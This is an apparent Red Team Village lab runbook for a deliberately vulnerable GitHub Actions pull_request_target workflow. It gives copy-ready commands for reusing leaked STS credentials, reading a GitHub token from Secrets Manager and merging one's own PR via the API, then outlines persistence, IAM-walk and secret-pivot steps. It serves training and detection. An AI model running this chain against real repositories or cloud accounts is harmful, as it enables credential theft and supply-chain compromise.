# Attendee Runbook: Trust the Pipeline, Lose the Kingdom

This is the live Red Team Village lab path. In the room, students run the core exploit live:

```text
PR → STS → demo secret → merge
```

The advanced cloud-native chain is taught with slides, logs, diagrams, and code artifacts during the hour. The public Terraform/code bundle is the take-home reproduction path for running the full chain later in a dedicated, empty AWS account you control.

## Safety contract

Everything in this lab is intentionally vulnerable and intentionally bounded.

- Use only the demo repository, demo AWS account, and handles assigned for this session.
- Do not use personal/work tokens, employer accounts, or real secrets.
- The live room path stops after the trophy-wall merge unless the facilitator explicitly says otherwise.
- Advanced Lambda/EventBridge, IAM graph, and pivot-secret material is shown through artifacts/code in the live hour.
- If your laptop or Wi-Fi fights you, pair with a neighbor and stay with the trust graph. The public bundle lets you rerun later.

## 60-minute map

- 00–10: room contract, safety model, architecture.
- 10–30: live hands-on — PR to merge authority.
- 30–44: advanced chain — slides, logs, code artifacts, diagrams.
- 44–54: detections and defenses.
- 54–60: Terraform/code takeaway, troubleshooting, close.

## Prereqs

You need:

- GitHub account.
- Browser signed into GitHub.
- Terminal with `aws`, `jq`, and `curl` if possible.
- Assigned handle from the room facilitator, for example `student07`.

Step 1 below sets your handle with a replacement value. Do not copy another student's handle; duplicate handles are rejected.

## Live hands-on: PR to merge authority

Use these steps in order. Each command block is safe to copy after you replace the named values with the room values.

### Step 1 — Set your handle

Goal: make every file and artifact use your assigned room handle.

Run this in your terminal:

```bash
export RTV_HANDLE="replace_with_your_assigned_handle"
export AWS_REGION="us-east-1"
```

Expected result: no output. Your shell now has `RTV_HANDLE` and `AWS_REGION`.

If stuck: use the handle on your badge/card, for example `student07`. Use only letters, numbers, underscores, or hyphens.

Why it matters: the trophy wall accepts only one JSON file whose filename matches your `handle`.

### Step 2 — Fork the demo repo

Goal: create your own fork so your PR is attacker-controlled input.

In your browser:

1. Open the public demo repo URL shown on the room slide.
2. Click **Fork**.
3. Keep the fork page open.

Expected result: you have a fork under your GitHub account.

If stuck: pair with a neighbor or ask for the room fixture path. Do not use a work/employer GitHub account.

Why it matters: the lab starts with a normal external pull request.

### Step 3 — Add your submission JSON

Goal: add one trophy-wall submission file from your fork or local checkout.

Run this in your fork checkout, or use GitHub's web editor to create the same file:

```bash
mkdir -p submissions
cat > "submissions/${RTV_HANDLE}.json" <<EOF
{
  "handle": "${RTV_HANDLE}",
  "message": "I controlled the pipeline."
}
EOF
```

Expected result: one file exists at `submissions/${RTV_HANDLE}.json`.

If stuck: the JSON must contain only `handle` and `message`. Do not add `timestamp`, HTML, or extra fields.

Why it matters: this file is harmless content, but the target repo workflow handles it with too much authority.

### Step 4 — Open a PR back to the demo repo

Goal: trigger the target repo's vulnerable workflow from your forked change.

In your browser:

1. Open a pull request from your fork.
2. Target the room demo repo and its default branch.
3. Submit the PR.

Expected result: a GitHub Actions run starts for your PR.

If stuck: confirm the PR targets the room demo repo, not your fork's default branch.

Why it matters: the vulnerable `pull_request_target` workflow runs in the target repository context.

### Step 5 — Copy temporary AWS credentials from the workflow log

Goal: use the workflow-created STS session from your PR run.

In your browser:

1. Open your PR.
2. Open the **Actions** run for that PR.
3. Find the copy-ready `export` lines in the workflow log.
4. Paste those lines into your terminal.

The lines should look like this after redaction:

```bash
export AWS_ACCESS_KEY_ID=REDACTED_AWS_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=REDACTED_AWS_SECRET_ACCESS_KEY
export AWS_SESSION_TOKEN=REDACTED_AWS_SESSION_TOKEN
export AWS_REGION=us-east-1
```

Expected result: no output. Your terminal now uses temporary lab AWS credentials.

If stuck: do not paste personal AWS credentials. Ask for the fixture log and follow along from the redacted export block.

Why it matters: temporary means expiring, not unstealable.

### Step 6 — Verify the temporary AWS identity

Goal: prove the workflow credentials work outside the workflow.

Run:

```bash
aws sts get-caller-identity
```

Expected result: AWS returns a demo lab assumed-role identity, not your personal AWS identity.

If stuck: check that all four export lines from Step 5 are in the same terminal session.

Why it matters: the trust boundary crossed from GitHub Actions into AWS STS.

### Step 7 — Read the demo GitHub token from Secrets Manager

Goal: use the narrow AWS role to retrieve the code-hosting token stored as a demo secret.

Run:

```bash
export RTV_PAT="$(aws secretsmanager get-secret-value \
  --secret-id demo/github-pat \
  --query SecretString \
  --output text)"
```

Expected result: no output. `RTV_PAT` is set in your shell.

If stuck: run Step 6 again. If STS identity works but this command fails, ask for the facilitator's fallback token proof.

Why it matters: the AWS role is narrow. The secret is not.

### Step 8 — Set the target repo and PR number

Goal: point the merge command at your PR in the room demo repo.

Run:

```bash
export DEMO_ORG="pipeline-demo-lab"
export DEMO_REPO="cicd-demo"
export PR_NUMBER="replace_with_your_pr_number"
```

Expected result: no output. `PR_NUMBER` matches the number in your PR URL.

If stuck: your PR URL ends with `/pull/NUMBER`; use that number.

Why it matters: the merge API call needs the target repo and your specific PR.

### Step 9 — Merge your own PR with the recovered token

Goal: prove the secret read becomes code-hosting authority.

Run:

```bash
curl -sS -X PUT \
  -H "Authorization: token ${RTV_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${DEMO_ORG}/${DEMO_REPO}/pulls/${PR_NUMBER}/merge" | jq .
```

Expected result: JSON showing the PR was merged.

If stuck: confirm `RTV_PAT`, `DEMO_ORG`, `DEMO_REPO`, and `PR_NUMBER` are set in the same terminal session.

Why it matters: you merged it with a credential that did not exist when you opened the PR.

### Step 10 — Refresh the trophy wall

Goal: see the visible impact of the merge.

In your browser:

1. Refresh your PR and confirm it is merged.
2. Open the trophy wall URL shown on the room slide.
3. Refresh after GitHub Pages deploys.

Expected result: your handle and message appear on the trophy wall.

If stuck: the Pages deploy may lag. Watch the facilitator screen or use the fixture trophy-wall screenshot.

Why it matters: the live room path ends at code-hosting impact. The rest of the chain is taught through artifacts/code.

At this point, pause live commands and follow the facilitator through the advanced chain artifacts.

## Advanced chain: taught with artifacts/code

The same trust mistake can continue beyond the live room path. During the session, the facilitator walks through code snippets, pre-captured logs, and diagrams for the rest of the chain.

### Controlled serverless persistence

Artifact/code path:

```bash
./lab/20-deploy-persistence.sh "${RTV_HANDLE}"
```

What the artifact demonstrates:

- handle/session-prefixed Lambda resources;
- a short-lived EventBridge/Scheduler trigger;
- proof output from logs;
- cleanup by session/handle.

Teaching point:

```text
No implant. No endpoint. No C2. Still durable cloud control-plane behavior.
```

### IAM graph walk

Artifact/code path:

```bash
./lab/30-assume-demo-role.sh "${RTV_HANDLE}"
```

What the artifact demonstrates:

- exactly one intended demo role edge;
- denied output for paths outside the lab graph;
- IAM trust policies as graph edges, not isolated policy blobs.

Teaching point:

```text
Trust policies are graph edges. Attackers walk graphs.
```

### Controlled secrets pivot

Artifact/code path:

```bash
./lab/40-read-demo-pivot-secrets.sh "${RTV_HANDLE}"
```

Demo categories:

- `demo/pivot/code-hosting-admin-token`
- `demo/pivot/ci-platform-admin-key`
- `demo/pivot/data-warehouse-creds`
- `demo/pivot/saas-api-key`

These must be fake/demo values only.

Teaching point:

```text
AWS is not the destination. The secret store is the bridge to everything around AWS.
```

## Find yourself in the logs

During the detection section, look for:

- GitHub PR/workflow events;
- `AssumeRoleWithWebIdentity`;
- `GetSecretValue` for the demo PAT;
- Lambda/EventBridge/Scheduler creation from the artifact walkthrough;
- `AssumeRole` graph movement from the artifact walkthrough;
- demo pivot-secret reads from the artifact walkthrough.

Teaching point:

```text
You generated the first pivot live. Now learn how to find the rest of the chain.
```

## Take-home Terraform/code

Do this **after the session**, not during the live room lab. Use a dedicated, empty AWS account you control.

Public bundle:

```text
https://github.com/x90skysn3k/rtv-cicd-attack-chain
```

### Take-home Step 1 — Clone the bundle

Goal: get the attendee-safe reproduction files.

Run:

```bash
git clone https://github.com/x90skysn3k/rtv-cicd-attack-chain.git
cd rtv-cicd-attack-chain
```

Expected result: you are inside the public bundle repository.

### Take-home Step 2 — Configure Terraform inputs

Goal: point Terraform at your empty AWS account and throwaway GitHub repo.

Run:

```bash
cd terraform/demo-account
cp terraform.tfvars.example terraform.tfvars
```

Edit `terraform.tfvars` and set:

```hcl
aws_account_id = "replace_with_your_empty_aws_account_id"
github_org     = "replace_with_your_throwaway_github_org"
github_repo    = "cicd-demo"
aws_region     = "us-east-1"
```

Expected result: `terraform.tfvars` exists locally and is not committed.

### Take-home Step 3 — Create the bounded AWS lab resources

Goal: create only the OIDC role and demo secret needed for the reproduction.

Run:

```bash
terraform init
terraform validate
terraform plan
terraform apply
```

Expected result: Terraform prints `role_arn`, `secret_name`, and `oidc_provider_arn`.

If stuck: confirm your active AWS credentials point at the same account as `aws_account_id`.

### Take-home Step 4 — Store a throwaway GitHub token

Goal: put a demo-scoped token into the lab secret.

Run:

```bash
aws secretsmanager put-secret-value \
  --secret-id demo/github-pat \
  --secret-string "replace_with_throwaway_demo_token"
```

Expected result: AWS accepts a new secret version.

If stuck: do not use a personal/work token. Create a throwaway token for the throwaway repo only.

### Take-home Step 5 — Walk the same student path

Goal: reproduce the live chain against your own empty account and throwaway repo.

Use the same live steps above:

```text
fork → submission JSON → PR → workflow log exports → STS identity → demo PAT read → merge → trophy wall
```

Expected result: the same trust-boundary failure is visible without using the conference AWS account.

The live session avoids Terraform so the hour stays focused on the attack graph, not provider downloads and state management.
